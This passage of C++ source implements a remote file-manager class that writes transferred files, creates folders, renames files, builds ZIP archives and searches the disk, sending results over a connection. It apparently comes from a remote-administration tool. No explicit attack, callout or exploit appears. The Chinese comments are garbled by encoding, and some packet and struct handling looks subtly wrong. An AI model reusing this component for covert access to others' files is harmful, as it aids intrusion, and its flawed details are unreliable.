	BOOL bRet = WriteFile(m_hFileRecv, pData, dwBytesToWrite, &dwBytesWrite, NULL);
// 	if (bRet == FALSE)
// 		printf("�ļ�д��ʧ��");
	dwOffsetLow = 0; dwOffsetHigh = 0;
	dwOffsetLow = SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_CURRENT);
	//CloseHandle(m_hFileRecv);  // �˴���Ҫ�ر�, �Ժ�Ҫ��
	// Ϊ�˱Ƚϣ�����������
	
	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}

void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((char *)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (char *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
	::MoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}

//ѹ�����ѹ���ļ�
void CFileManager::ExeCompress(BYTE *lpBuffer)  
{  
    char* pszFilePath = (char*)lpBuffer;  
    CString strInputPath = pszFilePath;  
    CString strOutputPath = strInputPath + ".zip";  
      
    if (CreateZipArchive(strInputPath, strOutputPath))  
    {  
        SendToken(TOKEN_COMPRESS_FINISH);  
    }  
    else  
    {  
        SendToken(TOKEN_COMPRESS_ERROR);  
    }  
}  
  
bool CFileManager::CreateZipArchive(const CString& inputPath, const CString& outputPath)  
{  
    FILE* zipFile = fopen(outputPath, "wb");  
    if (!zipFile) return false;  
      
    std::vector<ZipCentralDirEntry> centralDir;  
    std::vector<CString> filenames;  
    DWORD centralDirOffset = 0;  
      
    // ������ļ�����Ŀ¼  
    DWORD attrs = GetFileAttributes(inputPath);  
    if (attrs == INVALID_FILE_ATTRIBUTES) {  
        fclose(zipFile);  
        return false;  
    }  
      
    bool success = false;  
    if (attrs & FILE_ATTRIBUTE_DIRECTORY) {  
        // ѹ��Ŀ¼  
        success = CompressDirectory(zipFile, inputPath, "", centralDir, filenames, centralDirOffset);  
    } else {  
        // ѹ�������ļ�  
        CString fileName = inputPath;  
        int pos = fileName.ReverseFind('\\');  
        if (pos != -1) fileName = fileName.Mid(pos + 1);  
        success = CompressFile(zipFile, inputPath, fileName, centralDir, filenames, centralDirOffset);  
    }  
      
    if (success) {  
        WriteCentralDirectory(zipFile, centralDir, filenames, centralDirOffset);  
    }  
      
    fclose(zipFile);  
    return success;  
}  
  
bool CFileManager::CompressFile(FILE* zipFile, const CString& filePath, const CString& relativePath,   
                               std::vector<ZipCentralDirEntry>& centralDir, std::vector<CString>& filenames, DWORD& offset)  
{  
    FILE* inputFile = fopen(filePath, "rb");  
    if (!inputFile) return false;  
      
    // ��ȡ�ļ���С  
    fseek(inputFile, 0, SEEK_END);  
    DWORD fileSize = ftell(inputFile);  
    fseek(inputFile, 0, SEEK_SET);  
      
    // ��ȡ�ļ�����  
    BYTE* fileData = new BYTE[fileSize];  
    fread(fileData, 1, fileSize, inputFile);  
    fclose(inputFile);  
      
    // ����CRC32  
    DWORD crc = crc32(0L, Z_NULL, 0);  
    crc = crc32(crc, fileData, fileSize);  
      
    // ʹ��deflateInit2����ѹ��  
    z_stream strm;  
    strm.zalloc = Z_NULL;  
    strm.zfree = Z_NULL;  
    strm.opaque = Z_NULL;  
      
    // �ؼ���ʹ��-15��windowBits����raw deflate����  
    int ret = deflateInit2(&strm, Z_DEFAULT_COMPRESSION, Z_DEFLATED, -15, 8, Z_DEFAULT_STRATEGY);  
    if (ret != Z_OK) {  
        delete[] fileData;  
        return false;  
    }  
      
    // ѹ������  
    DWORD compressedSize = deflateBound(&strm, fileSize);  
    BYTE* compressedData = new BYTE[compressedSize];  
      
    strm.next_in = fileData;  
    strm.avail_in = fileSize;  
    strm.next_out = compressedData;  
    strm.avail_out = compressedSize;  
      
    ret = deflate(&strm, Z_FINISH);  
    if (ret != Z_STREAM_END) {  
        deflateEnd(&strm);  
        delete[] fileData;  
        delete[] compressedData;  
        return false;  
    }  
      
    compressedSize = strm.total_out;  
    deflateEnd(&strm);  
      
    // д��ZIP�����ļ�ͷ  
    ZipLocalFileHeader header = {0};  
    header.signature = 0x04034b50;  
    header.version = 20;  
    header.compression = 8; // deflate  
    header.crc32 = crc;  
    header.compressedSize = compressedSize;  
    header.uncompressedSize = fileSize;  
    header.filenameLength = relativePath.GetLength();  
      
    DWORD headerOffset = ftell(zipFile);  
    fwrite(&header, sizeof(header), 1, zipFile);  
	fwrite((LPCTSTR)relativePath, relativePath.GetLength(), 1, zipFile);

    fwrite(compressedData, compressedSize, 1, zipFile);  
      
    // ��ӵ�����Ŀ¼  
    ZipCentralDirEntry dirEntry = {0};  
    dirEntry.signature = 0x02014b50;  
    dirEntry.versionMade = 20;  
    dirEntry.versionNeeded = 20;  
    dirEntry.compression = 8;  
    dirEntry.crc32 = crc;  
    dirEntry.compressedSize = compressedSize;  
    dirEntry.uncompressedSize = fileSize;  
    dirEntry.filenameLength = relativePath.GetLength();  
    dirEntry.localHeaderOffset = headerOffset;  
      
    centralDir.push_back(dirEntry);  
    filenames.push_back(relativePath);  
      
    offset = ftell(zipFile);  
      
    delete[] fileData;  
    delete[] compressedData;  
    return true;  
}  
  
bool CFileManager::CompressDirectory(FILE* zipFile, const CString& dirPath, const CString& relativePath,  
                                   std::vector<ZipCentralDirEntry>& centralDir, std::vector<CString>& filenames, DWORD& offset)  
{  
    WIN32_FIND_DATA findData;  
    CString searchPath = dirPath + "\\*";  
    HANDLE hFind = FindFirstFile(searchPath, &findData);  
      
    if (hFind == INVALID_HANDLE_VALUE) return false;  
      
    do {  
        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)  
            continue;  
              
        CString fullPath = dirPath + "\\" + findData.cFileName;  
        CString newRelativePath = relativePath.IsEmpty() ? findData.cFileName : relativePath + "/" + findData.cFileName;  
          
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {  
            // �ݹ�ѹ����Ŀ¼  
            if (!CompressDirectory(zipFile, fullPath, newRelativePath, centralDir, filenames, offset)) {  
                FindClose(hFind);  
                return false;  
            }  
        } else {  
            // ѹ���ļ�  
            if (!CompressFile(zipFile, fullPath, newRelativePath, centralDir, filenames, offset)) {  
                FindClose(hFind);  
                return false;  
            }  
        }  
    } while (FindNextFile(hFind, &findData));  
      
    FindClose(hFind);  
    return true;  
}  
  
void CFileManager::WriteCentralDirectory(FILE* zipFile, const std::vector<ZipCentralDirEntry>& centralDir,   
                                        const std::vector<CString>& filenames, DWORD offset)  
{  
    DWORD centralDirStart = ftell(zipFile);  
      
    // д������Ŀ¼��Ŀ  
    for (size_t i = 0; i < centralDir.size(); i++) {  
        fwrite(&centralDir[i], sizeof(ZipCentralDirEntry), 1, zipFile);  
		fwrite((LPCTSTR)filenames[i], filenames[i].GetLength(), 1, zipFile);

    }  
      
    DWORD centralDirSize = ftell(zipFile) - centralDirStart;  
      
    // д������Ŀ¼������¼  
    ZipEndOfCentralDir endRecord = {0};  
    endRecord.signature = 0x06054b50;  
    endRecord.entriesOnDisk = centralDir.size();  
    endRecord.totalEntries = centralDir.size();  
    endRecord.centralDirSize = centralDirSize;  
    endRecord.centralDirOffset = centralDirStart;  
      
    fwrite(&endRecord, sizeof(endRecord), 1, zipFile);  
}

void CFileManager::SearchFile(LPBYTE lpBuffer)// �����ļ�
{
	FileSearchPacket mFileSearchPacket;
	memcpy( &mFileSearchPacket , lpBuffer , sizeof(FileSearchPacket) );
	
	CFileFinder _finder;
	CFileFinder::CFindOpts	opts;
	_finder.SetCallback(FileFinderProc,this);
	
	// ���� CFindOpts����
	opts.sBaseFolder = mFileSearchPacket.szDir;
	opts.sFileMask.Format("*%s*",mFileSearchPacket.szWord);
	opts.bSubfolders = mFileSearchPacket.bSubfordle;
	opts.FindNormalFiles();
	if (mFileSearchPacket.bSearchInFile)
	{
		opts.FindText(mFileSearchPacket.szWord);
	}
	
	_finder.RemoveAll();
	_finder.Find(opts);
	
	BYTE EndSearch[1];
	EndSearch[0] = TOKEN_SEARCH_END;
	Send(EndSearch,1);	
}
void CFileManager::FileFinderProc(CFileFinder *pFinder, DWORD dwCode, void *pCustomParam)// �ļ�������ص�����
{
	CString			sText, sNewFile;
	MSG				msg;
	int				nListIndex;
	CFileManager	*pDlg = (CFileManager *)pCustomParam;
	
	switch (dwCode)
	{
	case FF_FOUND:
		// �������ݰ�
		SearchResultPacket mSearchResult;
		sNewFile = pFinder->GetFilePath(pFinder->GetFileCount() - 1);
		lstrcpy(mSearchResult.szFullPath,sNewFile);
		
		// ��ȡ�ļ���С
		HANDLE handle = CreateFile(sNewFile, FILE_READ_EA, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
		if (handle != INVALID_HANDLE_VALUE)
		{
			mSearchResult.nFileSize = GetFileSize(handle, NULL);
			CloseHandle(handle);
		}
		
		// ��ȡ�ļ�����
		lstrcpy(mSearchResult.szFileName,PathFindFileName(sNewFile));
		
		// ��ȡʱ��
		SYSTEMTIME time;
        WIN32_FILE_ATTRIBUTE_DATA lpinf;
		GetFileAttributesEx(sNewFile,GetFileExInfoStandard,&lpinf);//��ȡ�ļ���Ϣ��pathΪ�ļ�·��
		FileTimeToSystemTime(&lpinf.ftLastWriteTime,&time);//ת��ʱ���ʽ��FILETIME��SYSTEMTIME
		wsprintf(mSearchResult.szDate,"%d-%d-%d",time.wYear,time.wMonth,time.wDay);
		
		int nPacketLength = sizeof(SearchResultPacket) + 2;
		LPBYTE lpBuffer = new BYTE[nPacketLength];
		lpBuffer[0] = TOKEN_SEARCH_ADD;
		memcpy(lpBuffer+1,&mSearchResult,sizeof(SearchResultPacket));
		pDlg->Send(lpBuffer,nPacketLength);
		// 		CString text;
		// 		text.Format("���ݣ� %s",lpBuffer);
		// 		MessageBox(NULL,text,"��ʾ",MB_OK);
		Sleep(10);
		break;
	}
}